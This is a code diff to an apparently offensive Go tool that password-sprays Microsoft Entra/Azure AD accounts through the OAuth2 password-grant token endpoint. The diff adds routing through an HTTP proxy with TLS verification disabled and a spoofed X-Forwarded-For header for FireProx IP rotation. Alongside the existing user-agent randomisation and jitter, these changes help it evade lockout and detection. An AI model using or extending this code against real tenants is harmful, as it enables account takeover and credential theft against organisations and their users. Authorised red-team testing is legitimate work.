@@ -4,12 +4,14 @@ import (
 	"bufio"
 	"bytes"
 	"context"
+	"crypto/tls"
 	"encoding/json"
 	"flag"
 	"fmt"
 	"io"
 	"math/rand"
 	"net/http"
+	neturl "net/url" // Use an alias to avoid shadowing with net/http
 	"os"
 	"os/signal"
 	"path/filepath"
@@ -35,7 +37,7 @@ type SprayConfig struct {
 	Threads   int
 }
 
-func sprayWorker(ctx context.Context, cfg SprayConfig, jobs <-chan [2]string, wg *sync.WaitGroup, results *[]Result, mu *sync.Mutex, verbose bool, noColor bool, logChan chan<- string, progressChan chan<- int, onlySuccess bool, onlySuccessNoMFA bool, client *http.Client, delayMs int, jitterMs int, printMu *sync.Mutex, progressState *progressInfo, uaProvider func() string, xfwd string) {
+func sprayWorker(ctx context.Context, cfg SprayConfig, jobs <-chan [2]string, wg *sync.WaitGroup, results *[]Result, mu *sync.Mutex, verbose bool, noColor bool, logChan chan<- string, progressChan chan<- int, onlySuccess bool, onlySuccessNoMFA bool, client *http.Client, delayMs int, jitterMs int, printMu *sync.Mutex, progressState *progressInfo, uaProvider func() string, xfwd bool) {
 	// ANSI color codes
 	colorReset := ""
 	colorGreen := ""
@@ -179,7 +181,7 @@ func removeANSICodes(s string) string {
 	return string(out)
 }
 
-func tryLogin(ctx context.Context, client *http.Client, username, password, url string, uaProvider func() string, xfwd string) (string, bool, string) {
+func tryLogin(ctx context.Context, client *http.Client, username, password, url string, uaProvider func() string, xfwd bool) (string, bool, string) {
 	data := []byte(fmt.Sprintf("resource=https://graph.windows.net&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&client_info=1&grant_type=password&username=%s&password=%s&scope=openid", username, password))
 	req, err := http.NewRequestWithContext(ctx, "POST", url+"/common/oauth2/token", bytes.NewBuffer(data))
 	if err != nil {
@@ -192,9 +194,9 @@ func tryLogin(ctx context.Context, client *http.Client, username, password, url 
 	} else {
 		req.Header.Set("User-Agent", "MsGopsy/1.0")
 	}
-	if xfwd != "" {
-		req.Header.Set("X-Forwarded-For", xfwd)
-		req.Header.Set("X-My-X-Forwarded-For", xfwd)
+	if xfwd {
+		//req.Header.Set("X-Forwarded-For", xfwd)
+		req.Header.Set("X-My-X-Forwarded-For", "127.0.0.1")
 	}
 
 	resp, err := client.Do(req)
@@ -285,13 +287,14 @@ func main() {
 		fmt.Fprintln(os.Stderr, "  -no-color                 Disable color output")
 		fmt.Fprintln(os.Stderr, "  -l, --log [dir]           Save raw log to file (optionally specify directory, default current directory)")
 		fmt.Fprintln(os.Stderr, "  -v                        Verbose: include invalid password lines")
-		fmt.Fprintln(os.Stderr, "  --only-success            Show only successful results (including MFA & conditional access)")
-		fmt.Fprintln(os.Stderr, "  --only-success-nomfa      Show only successful results (no MFA)")
-		fmt.Fprintln(os.Stderr, "  --delay-ms N              Base delay in milliseconds between attempts (rate limiting)")
-		fmt.Fprintln(os.Stderr, "  --jitter-ms N             Add random 0..N ms jitter to each delay")
-		fmt.Fprintln(os.Stderr, "  --user-agent UA           Set a custom User-Agent header")
-		fmt.Fprintln(os.Stderr, "  --user-agent-random       Use a random common User-Agent each request")
-		fmt.Fprintln(os.Stderr, "  --x-forwarded-for IP      Set X-Forwarded-For header (default 127.0.0.1)")
+		fmt.Fprintln(os.Stderr, "  -only-success            Show only successful results (including MFA & conditional access)")
+		fmt.Fprintln(os.Stderr, "  -only-success-nomfa      Show only successful results (no MFA)")
+		fmt.Fprintln(os.Stderr, "  -delay-ms N              Base delay in milliseconds between attempts (rate limiting)")
+		fmt.Fprintln(os.Stderr, "  -jitter-ms N             Add random 0..N ms jitter to each delay")
+		fmt.Fprintln(os.Stderr, "  -user-agent UA           Set a custom User-Agent header")
+		fmt.Fprintln(os.Stderr, "  -user-agent-random       Use a random common User-Agent each request")
+		fmt.Fprintln(os.Stderr, "  -proxy ip:port           Route requests through HTTP proxy (e.g., 127.0.0.1:8080 for Burp)")
+		fmt.Fprintln(os.Stderr, "  -x-forwarded-for         Set X-Forwarded-For header as 127.0.0.1 (Used for FireProx)")
 		fmt.Fprintln(os.Stderr, "  -h, --help                Show this help menu")
 	}
 
@@ -313,7 +316,8 @@ func main() {
 	jitterMs := flag.Int("jitter-ms", 0, "Random jitter 0..N ms added to delay")
 	userAgent := flag.String("user-agent", "", "Custom User-Agent header")
 	userAgentRandom := flag.Bool("user-agent-random", false, "Use random common User-Agent each request")
-	xfwdHeader := flag.String("x-forwarded-for", "127.0.0.1", "X-Forwarded-For header value")
+	xfwdHeader := flag.Bool("x-forwarded-for", false, "Set X-Forwarded-For header as 127.0.0.1 (Used for FireProx)")
+	proxyAddr := flag.String("proxy", "", "Route requests through HTTP proxy (ip:port, e.g., 127.0.0.1:8080)")
 	// Support long flags
 	flag.StringVar(username, "username", "", "Single username (user@domain.com)")
 	flag.StringVar(usernameList, "username-list", "", "File with usernames, one per line")
@@ -551,11 +555,20 @@ func main() {
 		defer func() { close(logChan); logWg.Wait() }()
 	}
 
-	// Reusable HTTP client
-	httpClient := &http.Client{Timeout: 15 * time.Second}
+	// Reusable HTTP client with optional proxy
+	var httpClient *http.Client
+	if *proxyAddr != "" {
+		proxyURL := fmt.Sprintf("http://%s", *proxyAddr)
+		proxyFunc := func(_ *http.Request) (*neturl.URL, error) {
+			return neturl.Parse(proxyURL)
+		}
+		transport := &http.Transport{Proxy: proxyFunc, TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
+		httpClient = &http.Client{Timeout: 15 * time.Second, Transport: transport}
+	} else {
+		httpClient = &http.Client{Timeout: 15 * time.Second}
+	}
 
 	// User-Agent provider
-	rand.Seed(time.Now().UnixNano())
 	commonAgents := []string{
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
 		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
